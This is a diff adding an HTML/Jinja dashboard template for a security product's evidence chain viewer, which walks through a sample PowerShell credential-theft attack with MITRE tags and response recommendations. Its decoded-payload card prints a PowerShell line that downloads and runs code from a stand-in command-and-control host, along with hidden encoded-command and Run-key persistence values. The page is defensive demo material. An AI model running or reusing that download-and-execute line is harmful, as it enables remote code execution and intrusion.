@@ -1,0 +1,1060 @@
+{% extends "dashboard/base.html" %}
+
+{% block title %}Evidence Chain Viewer - AMOSKYS{% endblock %}
+
+{% block content %}
+<div class="evidence-chain-viewer">
+    <!-- Page Header -->
+    <div class="evidence-header">
+        <div class="header-content">
+            <h1 class="page-title">🔗 EVIDENCE CHAIN VIEWER</h1>
+            <p class="page-subtitle">
+                Full-fidelity attack reconstruction showing how AMOSKYS correlates signals
+                across perspectives to build complete threat narratives
+            </p>
+        </div>
+        <div class="header-actions">
+            <button class="action-button" onclick="evidenceChain.loadSampleAttack('powershell')">
+                <span>📊</span> LOAD SAMPLE ATTACK
+            </button>
+            <button class="action-button" onclick="evidenceChain.exportChain()">
+                <span>⬇️</span> EXPORT CHAIN
+            </button>
+        </div>
+    </div>
+
+    <!-- Threat Summary Card -->
+    <div class="threat-summary-card" id="threat-summary">
+        <div class="summary-header">
+            <div class="threat-badge critical">CRITICAL</div>
+            <h2 class="threat-title">PowerShell-Based Credential Theft with C2 Communication</h2>
+            <div class="threat-meta">
+                <span class="meta-item">
+                    <strong>Detected:</strong> 2025-12-31 14:23:45 UTC
+                </span>
+                <span class="meta-item">
+                    <strong>Confidence:</strong> 98%
+                </span>
+                <span class="meta-item">
+                    <strong>Evidence Points:</strong> 7
+                </span>
+            </div>
+        </div>
+
+        <!-- MITRE ATT&CK Mapping -->
+        <div class="mitre-mapping">
+            <h3>MITRE ATT&CK Techniques</h3>
+            <div class="mitre-tags">
+                <span class="mitre-tag">T1566.001 - Phishing: Spearphishing Attachment</span>
+                <span class="mitre-tag">T1059.001 - Command and Scripting Interpreter: PowerShell</span>
+                <span class="mitre-tag">T1140 - Deobfuscate/Decode Files or Information</span>
+                <span class="mitre-tag">T1071.001 - Application Layer Protocol: Web Protocols</span>
+                <span class="mitre-tag">T1003.001 - OS Credential Dumping: LSASS Memory</span>
+                <span class="mitre-tag">T1547.001 - Boot or Logon Autostart: Registry Run Keys</span>
+            </div>
+        </div>
+
+        <!-- Narrative Summary -->
+        <div class="narrative-summary">
+            <h3>Threat Narrative</h3>
+            <p class="narrative-text">
+                <strong>Initial Vector:</strong> User opened suspicious email attachment "Invoice_2025.docx"
+                which spawned an obfuscated PowerShell process. <br><br>
+
+                <strong>Execution Chain:</strong> The PowerShell command decoded base64-encoded payload and
+                established connection to known malicious domain (malicious-c2.example[.]com). <br><br>
+
+                <strong>Credential Access:</strong> Process attempted to access LSASS memory for credential dumping,
+                followed by registry modification to establish persistence via Run key. <br><br>
+
+                <strong>Risk Assessment:</strong> High-confidence credential theft attempt with command-and-control
+                communication. Immediate containment recommended.
+            </p>
+        </div>
+    </div>
+
+    <!-- Evidence Timeline -->
+    <div class="evidence-timeline-section">
+        <h2 class="section-title">🕐 EVIDENCE TIMELINE</h2>
+        <p class="section-subtitle">Chronological reconstruction of attack progression across all perspectives</p>
+
+        <div class="timeline-container">
+            <!-- Evidence Point 1: File System -->
+            <div class="evidence-point" data-perspective="filesystem">
+                <div class="evidence-marker">
+                    <div class="marker-icon">📁</div>
+                    <div class="marker-line"></div>
+                </div>
+                <div class="evidence-card">
+                    <div class="evidence-card-header">
+                        <div class="perspective-badge filesystem">FILE SYSTEM</div>
+                        <div class="timestamp">14:23:12 UTC</div>
+                    </div>
+                    <h3 class="evidence-title">Suspicious Document Downloaded</h3>
+                    <div class="evidence-details">
+                        <div class="detail-row">
+                            <span class="detail-label">File Path:</span>
+                            <span class="detail-value code">C:\Users\jdoe\Downloads\Invoice_2025.docx</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">File Hash (SHA256):</span>
+                            <span class="detail-value code">7a3f9b2c...</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Size:</span>
+                            <span class="detail-value">47.2 KB</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Created By:</span>
+                            <span class="detail-value">OUTLOOK.EXE (PID: 3284)</span>
+                        </div>
+                    </div>
+                    <div class="evidence-analysis">
+                        <strong>Analysis:</strong> Word document with macro capabilities downloaded from email attachment.
+                        File created timestamp matches known phishing campaign timing.
+                    </div>
+                </div>
+            </div>
+
+            <!-- Evidence Point 2: Process Execution -->
+            <div class="evidence-point" data-perspective="process">
+                <div class="evidence-marker">
+                    <div class="marker-icon">⚙️</div>
+                    <div class="marker-line"></div>
+                </div>
+                <div class="evidence-card">
+                    <div class="evidence-card-header">
+                        <div class="perspective-badge process">PROCESS</div>
+                        <div class="timestamp">14:23:45 UTC</div>
+                    </div>
+                    <h3 class="evidence-title">Word Document Spawns PowerShell</h3>
+                    <div class="evidence-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Parent Process:</span>
+                            <span class="detail-value code">WINWORD.EXE (PID: 4892)</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Child Process:</span>
+                            <span class="detail-value code">powershell.exe (PID: 5124)</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Command Line:</span>
+                            <span class="detail-value code">
+                                powershell.exe -WindowStyle Hidden -EncodedCommand JAB...
+                            </span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">User Context:</span>
+                            <span class="detail-value">CORP\jdoe</span>
+                        </div>
+                    </div>
+                    <div class="evidence-analysis">
+                        <strong>Analysis:</strong> Abnormal parent-child relationship. Word should not spawn PowerShell
+                        with hidden window and encoded command. High suspicion indicator.
+                    </div>
+                    <div class="correlation-link">
+                        <span class="link-icon">🔗</span>
+                        <span class="link-text">Correlated with Evidence #1 (Document opened 33 seconds prior)</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Evidence Point 3: PowerShell Obfuscation -->
+            <div class="evidence-point" data-perspective="powershell">
+                <div class="evidence-marker">
+                    <div class="marker-icon">💻</div>
+                    <div class="marker-line"></div>
+                </div>
+                <div class="evidence-card">
+                    <div class="evidence-card-header">
+                        <div class="perspective-badge powershell">POWERSHELL</div>
+                        <div class="timestamp">14:23:46 UTC</div>
+                    </div>
+                    <h3 class="evidence-title">Obfuscated PowerShell Command Decoded</h3>
+                    <div class="evidence-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Encoded Command:</span>
+                            <span class="detail-value code">
+                                JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...
+                            </span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Decoded Payload:</span>
+                            <div class="code-block">
+<pre>$client = New-Object System.Net.WebClient
+$data = $client.DownloadString('http://malicious-c2.example.com/payload')
+Invoke-Expression $data</pre>
+                            </div>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Obfuscation Type:</span>
+                            <span class="detail-value">Base64 Encoding</span>
+                        </div>
+                    </div>
+                    <div class="evidence-analysis">
+                        <strong>Analysis:</strong> PowerShell command downloads and executes remote payload.
+                        Use of obfuscation indicates attempt to evade detection.
+                    </div>
+                    <div class="correlation-link">
+                        <span class="link-icon">🔗</span>
+                        <span class="link-text">Correlated with Evidence #2 (Same PID: 5124)</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Evidence Point 4: DNS Query -->
+            <div class="evidence-point" data-perspective="dns">
+                <div class="evidence-marker">
+                    <div class="marker-icon">🔍</div>
+                    <div class="marker-line"></div>
+                </div>
+                <div class="evidence-card">
+                    <div class="evidence-card-header">
+                        <div class="perspective-badge dns">DNS</div>
+                        <div class="timestamp">14:23:47 UTC</div>
+                    </div>
+                    <h3 class="evidence-title">Malicious Domain Lookup</h3>
+                    <div class="evidence-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Query:</span>
+                            <span class="detail-value code">malicious-c2.example.com</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Response IP:</span>
+                            <span class="detail-value code">45.33.32.156</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Process:</span>
+                            <span class="detail-value">powershell.exe (PID: 5124)</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Threat Intel:</span>
+                            <span class="detail-value threat">Known C2 domain - Last seen in APT28 campaign</span>
+                        </div>
+                    </div>
+                    <div class="evidence-analysis">
+                        <strong>Analysis:</strong> Domain flagged in multiple threat intelligence feeds as command-and-control
+                        infrastructure. High confidence malicious intent.
+                    </div>
+                    <div class="correlation-link">
+                        <span class="link-icon">🔗</span>
+                        <span class="link-text">Correlated with Evidence #3 (Domain from decoded PowerShell)</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Evidence Point 5: Network Connection -->
+            <div class="evidence-point" data-perspective="network">
+                <div class="evidence-marker">
+                    <div class="marker-icon">🌐</div>
+                    <div class="marker-line"></div>
+                </div>
+                <div class="evidence-card">
+                    <div class="evidence-card-header">
+                        <div class="perspective-badge network">NETWORK</div>
+                        <div class="timestamp">14:23:48 UTC</div>
+                    </div>
+                    <h3 class="evidence-title">C2 Connection Established</h3>
+                    <div class="evidence-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Source:</span>
+                            <span class="detail-value code">10.0.2.15:49823</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Destination:</span>
+                            <span class="detail-value code">45.33.32.156:443 (HTTPS)</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Process:</span>
+                            <span class="detail-value">powershell.exe (PID: 5124)</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Bytes Transferred:</span>
+                            <span class="detail-value">2.3 MB downloaded, 47 KB uploaded</span>
+                        </div>
+                    </div>
+                    <div class="evidence-analysis">
+                        <strong>Analysis:</strong> Large data download over encrypted channel. Transfer size consistent
+                        with second-stage payload delivery.
+                    </div>
+                    <div class="correlation-link">
+                        <span class="link-icon">🔗</span>
+                        <span class="link-text">Correlated with Evidence #4 (IP from DNS resolution)</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Evidence Point 6: Memory Access -->
+            <div class="evidence-point" data-perspective="memory">
+                <div class="evidence-marker">
+                    <div class="marker-icon">💾</div>
+                    <div class="marker-line"></div>
+                </div>
+                <div class="evidence-card">
+                    <div class="evidence-card-header">
+                        <div class="perspective-badge memory">MEMORY</div>
+                        <div class="timestamp">14:24:15 UTC</div>
+                    </div>
+                    <h3 class="evidence-title">LSASS Memory Access Attempt</h3>
+                    <div class="evidence-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Source Process:</span>
+                            <span class="detail-value code">powershell.exe (PID: 5124)</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Target Process:</span>
+                            <span class="detail-value code">lsass.exe (PID: 644)</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Access Rights:</span>
+                            <span class="detail-value code">PROCESS_VM_READ | PROCESS_QUERY_INFORMATION</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Technique:</span>
+                            <span class="detail-value threat">Credential Dumping Attempt</span>
+                        </div>
+                    </div>
+                    <div class="evidence-analysis">
+                        <strong>Analysis:</strong> PowerShell process attempting to read LSASS memory. Classic credential
+                        dumping technique (Mimikatz-style). Attack progression into credential access phase.
+                    </div>
+                    <div class="correlation-link">
+                        <span class="link-icon">🔗</span>
+                        <span class="link-text">Correlated with Evidence #2-5 (Same PowerShell PID chain)</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Evidence Point 7: Registry Persistence -->
+            <div class="evidence-point" data-perspective="registry">
+                <div class="evidence-marker">
+                    <div class="marker-icon">📋</div>
+                    <div class="marker-line final"></div>
+                </div>
+                <div class="evidence-card">
+                    <div class="evidence-card-header">
+                        <div class="perspective-badge registry">REGISTRY</div>
+                        <div class="timestamp">14:24:32 UTC</div>
+                    </div>
+                    <h3 class="evidence-title">Persistence Mechanism Installed</h3>
+                    <div class="evidence-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Registry Key:</span>
+                            <span class="detail-value code">
+                                HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+                            </span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Value Name:</span>
+                            <span class="detail-value code">WindowsUpdate</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Value Data:</span>
+                            <span class="detail-value code">
+                                powershell.exe -WindowStyle Hidden -EncodedCommand JAB...
+                            </span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Modified By:</span>
+                            <span class="detail-value">powershell.exe (PID: 5124)</span>
+                        </div>
+                    </div>
+                    <div class="evidence-analysis">
+                        <strong>Analysis:</strong> Registry Run key modification ensures malware executes at user logon.
+                        Establishes persistence on compromised system. Attack complete.
+                    </div>
+                    <div class="correlation-link">
+                        <span class="link-icon">🔗</span>
+                        <span class="link-text">Correlated with Evidence #2-6 (Same PowerShell attack chain)</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Correlation Graph -->
+    <div class="correlation-graph-section">
+        <h2 class="section-title">🕸️ CORRELATION GRAPH</h2>
+        <p class="section-subtitle">Visual representation of how evidence points connect across perspectives</p>
+
+        <div class="graph-container">
+            <div class="graph-legend">
+                <div class="legend-item">
+                    <div class="legend-color filesystem"></div>
+                    <span>File System</span>
+                </div>
+                <div class="legend-item">
+                    <div class="legend-color process"></div>
+                    <span>Process</span>
+                </div>
+                <div class="legend-item">
+                    <div class="legend-color powershell"></div>
+                    <span>PowerShell</span>
+                </div>
+                <div class="legend-item">
+                    <div class="legend-color dns"></div>
+                    <span>DNS</span>
+                </div>
+                <div class="legend-item">
+                    <div class="legend-color network"></div>
+                    <span>Network</span>
+                </div>
+                <div class="legend-item">
+                    <div class="legend-color memory"></div>
+                    <span>Memory</span>
+                </div>
+                <div class="legend-item">
+                    <div class="legend-color registry"></div>
+                    <span>Registry</span>
+                </div>
+            </div>
+
+            <div class="graph-placeholder">
+                <svg viewBox="0 0 800 400" class="correlation-svg">
+                    <!-- This would be a dynamic graph in production -->
+                    <text x="400" y="200" text-anchor="middle" fill="var(--text-secondary)" font-size="18">
+                        📊 Interactive Correlation Graph
+                    </text>
+                    <text x="400" y="230" text-anchor="middle" fill="var(--text-muted)" font-size="14">
+                        (Full implementation would show node-link diagram with D3.js)
+                    </text>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <!-- Response Recommendations -->
+    <div class="response-recommendations">
+        <h2 class="section-title">🛡️ RECOMMENDED RESPONSE ACTIONS</h2>
+        <div class="recommendations-grid">
+            <div class="recommendation-card priority-critical">
+                <div class="rec-header">
+                    <span class="rec-icon">🚨</span>
+                    <span class="rec-priority">IMMEDIATE</span>
+                </div>
+                <h3>Isolate Affected Endpoint</h3>
+                <p>Disconnect workstation CORP-WS-4892 from network to prevent lateral movement</p>
+                <button class="rec-action-button">EXECUTE ISOLATION</button>
+            </div>
+
+            <div class="recommendation-card priority-high">
+                <div class="rec-header">
+                    <span class="rec-icon">🔒</span>
+                    <span class="rec-priority">HIGH</span>
+                </div>
+                <h3>Terminate Malicious Process</h3>
+                <p>Kill PowerShell process (PID: 5124) and child processes</p>
+                <button class="rec-action-button">TERMINATE PROCESS</button>
+            </div>
+
+            <div class="recommendation-card priority-high">
+                <div class="rec-header">
+                    <span class="rec-icon">🔑</span>
+                    <span class="rec-priority">HIGH</span>
+                </div>
+                <h3>Reset User Credentials</h3>
+                <p>Force password reset for jdoe@corp.com - credentials likely compromised</p>
+                <button class="rec-action-button">RESET CREDENTIALS</button>
+            </div>
+
+            <div class="recommendation-card priority-medium">
+                <div class="rec-header">
+                    <span class="rec-icon">🧹</span>
+                    <span class="rec-priority">MEDIUM</span>
+                </div>
+                <h3>Remove Persistence</h3>
+                <p>Delete registry Run key: HKCU\...\Run\WindowsUpdate</p>
+                <button class="rec-action-button">REMOVE PERSISTENCE</button>
+            </div>
+
+            <div class="recommendation-card priority-medium">
+                <div class="rec-header">
+                    <span class="rec-icon">🌐</span>
+                    <span class="rec-priority">MEDIUM</span>
+                </div>
+                <h3>Block C2 Domain</h3>
+                <p>Add malicious-c2.example.com to firewall blocklist</p>
+                <button class="rec-action-button">BLOCK DOMAIN</button>
+            </div>
+
+            <div class="recommendation-card priority-low">
+                <div class="rec-header">
+                    <span class="rec-icon">🔍</span>
+                    <span class="rec-priority">LOW</span>
+                </div>
+                <h3>Hunt for Indicators</h3>
+                <p>Search for file hash and C2 domain across other endpoints</p>
+                <button class="rec-action-button">START HUNT</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+.evidence-chain-viewer {
+    max-width: 100%;
+}
+
+/* Page Header */
+.evidence-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 2rem;
+    padding-bottom: 2rem;
+    border-bottom: 2px solid rgba(0, 217, 255, 0.3);
+}
+
+.page-title {
+    font-size: 2rem;
+    font-weight: 900;
+    color: var(--neural-primary);
+    margin-bottom: 0.5rem;
+    letter-spacing: 2px;
+}
+
+.page-subtitle {
+    color: var(--text-secondary);
+    font-size: 1rem;
+    max-width: 600px;
+}
+
+.header-actions {
+    display: flex;
+    gap: 1rem;
+}
+
+.action-button {
+    background: rgba(0, 217, 255, 0.2);
+    border: 2px solid var(--neural-primary);
+    color: var(--neural-primary);
+    padding: 0.75rem 1.5rem;
+    border-radius: 5px;
+    font-size: 0.9rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+}
+
+.action-button:hover {
+    background: var(--neural-primary);
+    color: var(--bg-primary);
+}
+
+/* Threat Summary Card */
+.threat-summary-card {
+    background: linear-gradient(135deg, rgba(102, 0, 34, 0.3) 0%, rgba(51, 0, 17, 0.5) 100%);
+    border: 2px solid var(--neural-danger);
+    border-radius: 10px;
+    padding: 2rem;
+    margin-bottom: 3rem;
+}
+
+.summary-header {
+    margin-bottom: 2rem;
+}
+
+.threat-badge {
+    display: inline-block;
+    padding: 0.5rem 1rem;
+    border-radius: 5px;
+    font-size: 0.75rem;
+    font-weight: 800;
+    letter-spacing: 1.5px;
+    margin-bottom: 1rem;
+}
+
+.threat-badge.critical {
+    background: var(--neural-danger);
+    color: white;
+}
+
+.threat-title {
+    font-size: 1.8rem;
+    font-weight: 800;
+    color: var(--neural-danger);
+    margin-bottom: 1rem;
+}
+
+.threat-meta {
+    display: flex;
+    gap: 2rem;
+    color: var(--text-secondary);
+    font-size: 0.9rem;
+}
+
+.meta-item strong {
+    color: var(--text-primary);
+}
+
+/* MITRE Mapping */
+.mitre-mapping {
+    margin-bottom: 2rem;
+    padding: 1.5rem;
+    background: rgba(0, 0, 0, 0.3);
+    border-radius: 8px;
+}
+
+.mitre-mapping h3 {
+    color: var(--neural-primary);
+    font-size: 1.1rem;
+    margin-bottom: 1rem;
+}
+
+.mitre-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.75rem;
+}
+
+.mitre-tag {
+    background: rgba(255, 99, 71, 0.2);
+    border: 1px solid rgba(255, 99, 71, 0.4);
+    color: #ff6347;
+    padding: 0.5rem 0.75rem;
+    border-radius: 5px;
+    font-size: 0.85rem;
+    font-weight: 600;
+    font-family: 'Courier New', monospace;
+}
+
+/* Narrative Summary */
+.narrative-summary {
+    padding: 1.5rem;
+    background: rgba(0, 0, 0, 0.3);
+    border-radius: 8px;
+}
+
+.narrative-summary h3 {
+    color: var(--neural-primary);
+    font-size: 1.1rem;
+    margin-bottom: 1rem;
+}
+
+.narrative-text {
+    color: var(--text-secondary);
+    line-height: 1.8;
+    font-size: 0.95rem;
+}
+
+/* Section Titles */
+.section-title {
+    font-size: 1.5rem;
+    font-weight: 800;
+    color: var(--neural-primary);
+    margin-bottom: 0.5rem;
+    letter-spacing: 2px;
+}
+
+.section-subtitle {
+    color: var(--text-secondary);
+    font-size: 1rem;
+    margin-bottom: 2rem;
+}
+
+/* Evidence Timeline */
+.evidence-timeline-section {
+    margin-bottom: 4rem;
+}
+
+.timeline-container {
+    position: relative;
+    padding: 2rem 0;
+}
+
+.evidence-point {
+    display: grid;
+    grid-template-columns: 80px 1fr;
+    gap: 2rem;
+    margin-bottom: 3rem;
+}
+
+.evidence-marker {
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.marker-icon {
+    width: 60px;
+    height: 60px;
+    background: rgba(0, 217, 255, 0.2);
+    border: 3px solid var(--neural-primary);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.8rem;
+    z-index: 2;
+}
+
+.marker-line {
+    position: absolute;
+    top: 60px;
+    width: 3px;
+    height: calc(100% + 3rem);
+    background: linear-gradient(180deg, var(--neural-primary) 0%, rgba(0, 217, 255, 0.3) 100%);
+    z-index: 1;
+}
+
+.marker-line.final {
+    display: none;
+}
+
+/* Evidence Cards */
+.evidence-card {
+    background: rgba(10, 14, 39, 0.8);
+    border: 2px solid rgba(0, 217, 255, 0.3);
+    border-radius: 10px;
+    padding: 1.5rem;
+    transition: all 0.3s ease;
+}
+
+.evidence-card:hover {
+    border-color: var(--neural-primary);
+    box-shadow: 0 5px 25px rgba(0, 217, 255, 0.3);
+}
+
+.evidence-card-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 1rem;
+}
+
+.perspective-badge {
+    padding: 0.4rem 0.8rem;
+    border-radius: 5px;
+    font-size: 0.7rem;
+    font-weight: 800;
+    letter-spacing: 1px;
+}
+
+.perspective-badge.filesystem { background: rgba(139, 69, 19, 0.8); color: #daa520; }
+.perspective-badge.process { background: rgba(0, 136, 255, 0.3); color: #0088ff; }
+.perspective-badge.powershell { background: rgba(0, 119, 204, 0.3); color: #0077cc; }
+.perspective-badge.dns { background: rgba(128, 0, 128, 0.3); color: #9370db; }
+.perspective-badge.network { background: rgba(34, 139, 34, 0.3); color: #32cd32; }
+.perspective-badge.memory { background: rgba(255, 140, 0, 0.3); color: #ffa500; }
+.perspective-badge.registry { background: rgba(220, 20, 60, 0.3); color: #ff6347; }
+
+.timestamp {
+    color: var(--text-muted);
+    font-size: 0.85rem;
+    font-family: 'Courier New', monospace;
+}
+
+.evidence-title {
+    font-size: 1.2rem;
+    font-weight: 800;
+    color: var(--neural-primary);
+    margin-bottom: 1rem;
+}
+
+.evidence-details {
+    margin-bottom: 1rem;
+    padding: 1rem;
+    background: rgba(0, 0, 0, 0.3);
+    border-radius: 5px;
+}
+
+.detail-row {
+    display: grid;
+    grid-template-columns: 180px 1fr;
+    gap: 1rem;
+    margin-bottom: 0.75rem;
+}
+
+.detail-row:last-child {
+    margin-bottom: 0;
+}
+
+.detail-label {
+    color: var(--text-muted);
+    font-size: 0.85rem;
+    font-weight: 600;
+}
+
+.detail-value {
+    color: var(--text-primary);
+    font-size: 0.85rem;
+}
+
+.detail-value.code {
+    font-family: 'Courier New', monospace;
+    color: var(--neural-secondary);
+}
+
+.detail-value.threat {
+    color: var(--neural-danger);
+    font-weight: 700;
+}
+
+.code-block {
+    margin-top: 0.5rem;
+}
+
+.code-block pre {
+    background: rgba(0, 0, 0, 0.5);
+    padding: 1rem;
+    border-radius: 5px;
+    color: var(--neural-success);
+    font-size: 0.8rem;
+    overflow-x: auto;
+}
+
+.evidence-analysis {
+    padding: 1rem;
+    background: rgba(0, 217, 255, 0.05);
+    border-left: 3px solid var(--neural-primary);
+    border-radius: 5px;
+    margin-bottom: 1rem;
+    color: var(--text-secondary);
+    font-size: 0.9rem;
+    line-height: 1.6;
+}
+
+.correlation-link {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    padding: 0.75rem;
+    background: rgba(0, 255, 136, 0.1);
+    border: 1px solid rgba(0, 255, 136, 0.3);
+    border-radius: 5px;
+    color: var(--neural-success);
+    font-size: 0.85rem;
+}
+
+.link-icon {
+    font-size: 1.2rem;
+}
+
+/* Correlation Graph */
+.correlation-graph-section {
+    margin-bottom: 4rem;
+}
+
+.graph-container {
+    background: rgba(10, 14, 39, 0.8);
+    border: 2px solid rgba(0, 217, 255, 0.3);
+    border-radius: 10px;
+    padding: 2rem;
+}
+
+.graph-legend {
+    display: flex;
+    justify-content: center;
+    gap: 2rem;
+    margin-bottom: 2rem;
+    flex-wrap: wrap;
+}
+
+.legend-item {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-size: 0.85rem;
+    color: var(--text-secondary);
+}
+
+.legend-color {
+    width: 20px;
+    height: 20px;
+    border-radius: 3px;
+}
+
+.legend-color.filesystem { background: rgba(139, 69, 19, 0.8); }
+.legend-color.process { background: rgba(0, 136, 255, 0.8); }
+.legend-color.powershell { background: rgba(0, 119, 204, 0.8); }
+.legend-color.dns { background: rgba(128, 0, 128, 0.8); }
+.legend-color.network { background: rgba(34, 139, 34, 0.8); }
+.legend-color.memory { background: rgba(255, 140, 0, 0.8); }
+.legend-color.registry { background: rgba(220, 20, 60, 0.8); }
+
+.graph-placeholder {
+    min-height: 400px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Response Recommendations */
+.response-recommendations {
+    margin-bottom: 2rem;
+}
+
+.recommendations-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 1.5rem;
+}
+
+.recommendation-card {
+    background: rgba(10, 14, 39, 0.8);
+    border: 2px solid;
+    border-radius: 10px;
+    padding: 1.5rem;
+    transition: all 0.3s ease;
+}
+
+.recommendation-card.priority-critical {
+    border-color: var(--neural-danger);
+}
+
+.recommendation-card.priority-high {
+    border-color: var(--neural-warning);
+}
+
+.recommendation-card.priority-medium {
+    border-color: var(--neural-secondary);
+}
+
+.recommendation-card.priority-low {
+    border-color: rgba(0, 217, 255, 0.3);
+}
+
+.recommendation-card:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 5px 20px rgba(0, 217, 255, 0.3);
+}
+
+.rec-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 1rem;
+}
+
+.rec-icon {
+    font-size: 2rem;
+}
+
+.rec-priority {
+    padding: 0.3rem 0.6rem;
+    border-radius: 3px;
+    font-size: 0.7rem;
+    font-weight: 800;
+    letter-spacing: 1px;
+}
+
+.priority-critical .rec-priority {
+    background: var(--neural-danger);
+    color: white;
+}
+
+.priority-high .rec-priority {
+    background: var(--neural-warning);
+    color: var(--bg-primary);
+}
+
+.priority-medium .rec-priority {
+    background: var(--neural-secondary);
+    color: var(--bg-primary);
+}
+
+.priority-low .rec-priority {
+    background: rgba(0, 217, 255, 0.3);
+    color: var(--neural-primary);
+}
+
+.recommendation-card h3 {
+    font-size: 1.1rem;
+    font-weight: 800;
+    color: var(--neural-primary);
+    margin-bottom: 0.75rem;
+}
+
+.recommendation-card p {
+    color: var(--text-secondary);
+    font-size: 0.9rem;
+    line-height: 1.5;
+    margin-bottom: 1rem;
+}
+
+.rec-action-button {
+    width: 100%;
+    background: rgba(0, 217, 255, 0.2);
+    border: 1px solid var(--neural-primary);
+    color: var(--neural-primary);
+    padding: 0.75rem;
+    border-radius: 5px;
+    font-size: 0.85rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.3s ease;
+}
+
+.rec-action-button:hover {
+    background: var(--neural-primary);
+    color: var(--bg-primary);
+}
+
+/* Responsive Design */
+@media (max-width: 1200px) {
+    .recommendations-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+}
+
+@media (max-width: 768px) {
+    .evidence-header {
+        flex-direction: column;
+        align-items: flex-start;
+    }
+
+    .header-actions {
+        margin-top: 1rem;
+        flex-direction: column;
+        width: 100%;
+    }
+
+    .action-button {
+        width: 100%;
+    }
+
+    .evidence-point {
+        grid-template-columns: 60px 1fr;
+        gap: 1rem;
+    }
+
+    .detail-row {
+        grid-template-columns: 1fr;
+    }
+
+    .recommendations-grid {
+        grid-template-columns: 1fr;
+    }
+}
+</style>
+
+<script>
+class EvidenceChain {
+    constructor() {
+        this.init();
+    }
+
+    init() {
+        console.log('Evidence Chain Viewer initialized with synthetic PowerShell attack data');
+    }
+
+    loadSampleAttack(attackType) {
+        alert(`LOADING SAMPLE ATTACK: ${attackType.toUpperCase()}\n\nThis evidence chain viewer shows a complete PowerShell-based credential theft attack.\n\nIn production, you could load different attack scenarios:\n- Ransomware deployment\n- Lateral movement\n- Data exfiltration\n- Supply chain compromise`);
+    }
+
+    exportChain() {
+        alert('EXPORT EVIDENCE CHAIN\n\nIn production, this would export:\n- Complete evidence timeline (JSON/PDF)\n- All correlation metadata\n- MITRE ATT&CK mapping\n- Response recommendations\n- Forensic artifact bundle');
+    }
+}
+
+// Initialize Evidence Chain Viewer
+let evidenceChain;
+document.addEventListener('DOMContentLoaded', () => {
+    evidenceChain = new EvidenceChain();
+});
+</script>
+{% endblock %}
